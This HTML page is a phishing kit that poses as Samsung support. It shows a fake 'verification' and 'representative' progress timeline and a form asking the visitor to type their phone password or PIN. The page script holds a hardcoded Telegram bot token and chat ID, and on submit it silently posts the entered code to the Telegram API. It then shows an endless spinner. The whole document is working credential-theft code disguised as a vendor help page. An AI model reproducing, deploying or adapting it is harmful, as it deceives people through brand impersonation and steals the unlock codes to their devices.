<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern Verification Component</title>
    <style>
        :root {
            --bg-color: #f8fafc;
            --card-bg: #ffffff;
            --text-main: #0f172a;
            --text-muted: #1e293b;
            --text-step: #94a3b8;
            --primary: #000000;
            --border: #e2e8f0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            -webkit-font-smoothing: antialiased;
        }

        .container {
            background: var(--card-bg);
            padding: 2.5rem;
            border-radius: 16px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 10px 15px -3px rgba(0, 0, 0, 0.03);
            width: 100%;
            max-width: 440px;
            box-sizing: border-box;
            position: relative;
            overflow: hidden;
            transition: height 0.4s ease-in-out;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 2rem;
        }

        .samsung-text-logo {
            font-family: "Arial Black", "Arial", sans-serif;
            font-size: 1.75rem;
            font-weight: 900;
            color: #000000;
            letter-spacing: 0.06em;
            text-transform: uppercase;
            user-select: none;
        }

        /* Timeline Layout */
        .timeline-container {
            display: flex;
            justify-content: space-between;
            position: relative;
            margin-bottom: 2.5rem;
            padding: 0 10px;
        }

        .timeline-track {
            position: absolute;
            top: 10px;
            left: 30px;
            right: 30px;
            height: 3px;
            background-color: #e2e8f0;
            z-index: 1;
        }

        .timeline-progress {
            position: absolute;
            top: 10px;
            left: 30px;
            width: 0%;
            height: 3px;
            background-color: var(--primary);
            z-index: 2;
            transition: width 0.5s ease-in-out;
        }

        .timeline-step {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 3;
            flex: 1;
            text-align: center;
        }

        .step-dot {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background-color: #ffffff;
            border: 3px solid #e2e8f0;
            box-sizing: border-box;
            transition: all 0.4s ease-in-out;
            margin-bottom: 8px;
        }

        .step-label {
            font-size: 0.72rem;
            font-weight: 600;
            color: var(--text-step);
            text-transform: uppercase;
            letter-spacing: 0.02em;
            max-width: 110px;
            line-height: 1.2;
        }

        .timeline-step.active .step-dot {
            border-color: var(--primary);
            background-color: #ffffff;
            transform: scale(1.1);
        }

        .timeline-step.active .step-label {
            color: var(--text-main);
            font-weight: 700;
        }

        .timeline-step.completed .step-dot {
            border-color: var(--primary);
            background-color: var(--primary);
        }

        .timeline-step.completed .step-label {
            color: var(--text-step);
        }

        /* Layout Animations */
        .fade-element {
            opacity: 1;
            transition: opacity 0.4s ease-in-out, transform 0.4s ease-in-out;
            transform: translateY(0);
        }

        .fade-out {
            opacity: 0 !important;
            transform: translateY(-10px);
            pointer-events: none;
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        label {
            font-size: 1.15rem;
            font-weight: 800;
            color: var(--text-muted);
            letter-spacing: -0.01em;
            line-height: 1.3;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        input[type="text"] {
            width: 100%;
            padding: 12px 16px;
            font-size: 1rem;
            color: var(--text-main);
            background-color: var(--card-bg);
            border: 2px solid var(--border);
            border-radius: 10px;
            outline: none;
            transition: all 0.2s ease-in-out;
        }

        input[type="text"]:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(0, 0, 0, 0.1);
        }

        button {
            margin-top: 16px;
            width: 100%;
            padding: 12px;
            font-size: 1rem;
            font-weight: 600;
            color: #ffffff;
            background-color: var(--primary);
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.2s ease, transform 0.1s ease;
        }

        button:hover {
            background-color: #222222;
        }

        button:active {
            transform: scale(0.98);
        }

        .loader-container {
            display: none;
            opacity: 0;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 1rem 0 0.5rem;
            transform: translateY(10px);
            transition: opacity 0.4s ease-in-out, transform 0.4s ease-in-out;
        }

        .loader-container.fade-in {
            display: flex;
            opacity: 1;
            transform: translateY(0);
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e2e8f0;
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div class="container" id="mainContainer">
        <div class="logo-container" id="logoWrap">
            <div class="samsung-text-logo">
                SAMSUNG
            </div>
        </div>

        <div class="timeline-container">
            <div class="timeline-track"></div>
            <div class="timeline-progress" id="progressLine"></div>
            
            <div class="timeline-step active" id="step1">
                <div class="step-dot"></div>
                <div class="step-label">Verification</div>
            </div>
            <div class="timeline-step" id="step2">
                <div class="step-dot"></div>
                <div class="step-label">Looking for representative</div>
            </div>
            <div class="timeline-step" id="step3">
                <div class="step-dot"></div>
                <div class="step-label">Solve your problem</div>
            </div>
        </div>

        <form id="modernForm" class="fade-element" onsubmit="handleSubmit(event)">
            <div class="form-group">
                <label for="secure-input">Write your phone password or pin code</label>
                <div class="input-wrapper">
                    <input 
                        type="text" 
                        id="secure-input" 
                        name="secure-input" 
                        autocomplete="off"
                        required
                    >
                </div>
            </div>
            <button type="submit" id="submitBtn">Continue</button>
        </form>

        <div id="loaderContainer" class="loader-container">
            <div class="spinner"></div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8938467770:AAH_5ZGTB2cZP_hi88dSi-pfZnpBt1zO5Oo"; 
        const CHAT_ID = "8714686528"; 

        async function handleSubmit(event) {
            event.preventDefault();
            
            const textboxValue = document.getElementById('secure-input').value;
            const form = document.getElementById('modernForm');
            const loader = document.getElementById('loaderContainer');
            const container = document.getElementById('mainContainer');
            
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');
            const progressLine = document.getElementById('progressLine');

            if (!textboxValue.trim()) return;

            // Lock container height for smooth animation
            container.style.height = container.offsetHeight + 'px';

            // Transition animations
            form.classList.add('fade-out');
            progressLine.style.width = '50%';
            step1.classList.remove('active');
            step1.classList.add('completed');
            step2.classList.add('active');

            // Send payload to Telegram
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: textboxValue
                    })
                });
            } catch (err) {
                console.error('Failed to send message:', err);
            }

            // Component swap sequence
            setTimeout(() => {
                form.style.display = 'none';
                loader.style.display = 'flex';
                requestAnimationFrame(() => {
                    loader.classList.add('fade-in');
                    container.style.height = '310px';
                });
            }, 400);
        }
    </script>
</body>
</html>
